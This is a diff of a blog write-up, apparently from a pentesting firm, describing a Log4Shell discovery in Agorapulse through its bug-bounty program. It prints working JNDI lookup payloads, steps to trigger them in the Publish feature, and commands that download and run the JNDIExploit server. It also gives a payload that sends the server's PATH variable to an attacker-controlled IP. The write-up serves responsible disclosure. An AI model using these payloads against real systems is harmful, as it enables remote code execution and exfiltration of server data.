@@ -24,37 +24,88 @@ Agorapulse basically provides everything an organization  could possibly need fo
 
 It was the middle of winter of 2021 when the news of log4j vulnerability broke out in the cyber security industry. And as the norm goes, it got all the security researchers on their heels. As the clock was ticking our company decided to focus wholly on exploiting this vulnerability.
 
-Our company had many targets to focus on and scan for this vulnerability. So the options were open. One of those available targets was agorapulse. Due to its dynamic nature and multiple functionality it was a preferable target  for our company. 
+Our company had many targets to focus on and scan for this vulnerability. So the options were open. One of those available targets was agorapulse. We plunged into research mode and figured out how we were going to scan for this vulnerability, Due to the fact that the vulnerability could be present on any endpoint, any request it was really hard to focus on one part of an application. So decided to scrap payloads all over the web application and wait for any pingbacks, To do that we We identified features and functionalities where we could use our payloads.
 
-So now the target was chosen , we plunged into research mode and figured out how we were going to scan for this vulnerability. We identified features and functionalities where we could use our payloads.
+As the application was pretty vast with multiple features, we had to stay organized. We used a simple and comprehensive approach of pasting payloads everywhere in the application and as said above to keep things organized we used functionality-specific identifiers in the payloads. 
 
-As the application was pretty vast with multiple features, we had to stay organized. We used a simple and comprehensive approach of pasting payloads everywhere in the application and as said above to keep things organized we used numeric numbering to identify the triggered payloads. 
+For example, We used 
 
-{{examples of identifiable payloads}}
-
-
-On the other hand we also played it safe, using a payload that was not at all harmful to the client i,e did not result in any denial of service attack or executing any malicious code inside the application. The purpose of the payload was just to give us a pingback so the place of vulnerability could be identified. So we devised the following safe payload to identify the dns pingbacks : ${jndi:ldap://<Your-Burp-Collab-URL>/a} .
-
-So now the identification process began and after a while we received two pingbacks. One of the received was a false pingback. But next up we had a dns pingback that identified the log4js vulnerability in that framework.
+If we were using a payload in profile-picture field we would use `${jndi:ldap://profilepic.<Your-Burp-Collab-URL>/a}` and if we were pasting a payload in messege box we used `${jndi:ldap://inbox.<Your-Burp-Collab-URL>/a}` and so on, It easily allowed us to indentify the vulnerable request to trigger the vulnerability.
 
 
+On the other hand we also played it safe, using a payload that was not at all harmful to the client i,e did not result in any denial of service attack or executing any malicious coommands inside the application. The purpose of the payload was just to give us a pingback so the place of vulnerability could be identified. So we devised the following safe payload to identify the dns pingbacks : `${jndi:ldap://<Your-Burp-Collab-URL>/a}` .
 
-## Demonstration of Impact
+So now the identification process began and after a while we received two pingbacks. One of the received was a false pingback. But next up we had a dns pingback that identified the presence of Log4shell vulnerability.
 
 
-As mentioned in earlier sections the successful exploitation could lead to RCE. We refrained from doing any such action which could lead to any kind of issues to the vulnerable server or the service. So, we just checked for the DNS pingback from the vulnerable server with our payload. When the victim server logs the request using log4j, then log4j interpolates the string and queries malicious Ldap server and then LDAp server responds with malicious Java class.
-The contents of log messages often contain user-controlled data, attackers can insert JNDI references pointing to LDAP servers they control, ready to serve malicious Java classes that perform any action they choose.
+## Summarizing the Steps
 
-In the payload we could use  any arbitrary command that could be executed on the server but in this case we used the following payload just to extract the environment variables of the server.
+So the steps to reproduce were as follows
 
-Payload : ${jndi:ldap://54.147.33.250:1389/${env:PATH}}
+- Start Burp and create a new burp collaborator Client
+- Now Login to agorapulse and click on `Publish` to publish a new post.
 
-{{screenshot}}
+1.png
+
+- Now use your burp collaborator to make a new payload `${jndi:ldap://<Your-Burp-Collab-URL>/a}`, and paste it in the Post Section.
+- Now Select any profile from the left side and Publish the POST
+
+2.png
+
+- On going back to burp collaborator Client you will see a Pingback on it
+3.png
+
+- 
+  
+## Demonstration of Impact ( Remote Code Execution )
+
+
+As mentioned in earlier sections the successful exploitation could lead to RCE. We refrained from doing any such action which could lead to any kind of disruption in services to the vulnerable services. So, we decide to prove the impact by extacting the global PATH variable to prove the real impact of the vulnerability and we needed to setup and JNDI server for that, So we quickly setup an amazon ec2 and setup an JNDI server using the following approach.
+
+- SSH to your Server
+``
+ssh user@<your-ip>
+```
+
+- Download and Install JNDI Server
+
+```
+wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
+unzip JNDIExploit.v1.2.zip
+```
+-Run the Exploit and you should see the following output on screen
+
+```
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <your-ip> -p 8888
+```
+
+After the following commands we had our JDNI server running on our `ServerIP:8888`
+
+As we went back to Agorapulse and make a another post with this Payload : `${jndi:ldap://[ServerIp]:1389/${env:PATH}`
+
+  
+we were able just able to extract the environment variables of the server.
+
+
+4.png
+  
 
 We stopped right after extracting the path variables of the vulnerable server just to keep the exploitation ethical.
 
 ## Response of Agora Team
 
-Submitting the report to the agora team, we got their first response in a day. They were responsive and concerned with the security of their online assets. They fixed the bug in a couple of days and rewarded our finding.
+Submitting the report to the agora team, we got their first response in a day. They were responsive and concerned with the security of their online assets. They fixed the bug in a on the same day and rewarded our finding.
 
-After their fix was implemented we  tried various payloads and bypasses to conform if the fix was working well. But we were unable to bypass the fix and it was working fine and we confirmed the fix.
+After their fix was implemented we , The team requested an re-check on the vulnerability and we tried various payloads and bypasses to conform if the fix was working well. But we were unable to bypass the fix and it was working fine and we confirmed the fix.
+
+  
+  
+
+
+## About us
+
+Snapsec is a team of security experts specialized in providing pentesting and other security services to secure your online assets. We have a specialized testing methodology that ensures in-depth testing of your business logic and other latest vulnerabilities. 
+
+ If you are looking for a team that values your security and ensures that you are fully secure against online security threats, feel free to get in touch with us #[support@snapsec.co](mailto:support@snapsec.co)
+ 
+ 
